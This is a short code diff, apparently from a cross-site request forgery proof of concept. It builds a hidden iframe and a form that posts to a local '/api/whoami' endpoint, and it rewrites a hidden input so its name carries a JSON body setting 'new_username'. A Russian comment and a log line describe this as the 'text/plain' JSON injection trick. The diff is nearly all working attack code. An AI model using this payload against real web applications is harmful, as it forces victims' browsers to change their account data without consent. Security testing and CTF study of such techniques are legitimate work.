@@ -28,6 +28,7 @@
       iframe.style.display = 'none';
       document.body.appendChild(iframe);
 
+      // Вариант 1: text/plain trick для JSON
       const form = document.createElement('form');
       form.method = 'POST';
       form.action = 'http://localhost:8000/api/whoami';
@@ -36,9 +37,11 @@
 
       const input = document.createElement('input');
       input.type = 'hidden';
-      input.name = '{"new_username":"wildspruce","ignore":"';
-      input.value = '"}';
+      input.name = '{"new_username":"wildspruce"}';
+      input.value = '';
       form.appendChild(input);
+
+      log('Trying text/plain JSON injection...');
 
       document.body.appendChild(form);
 
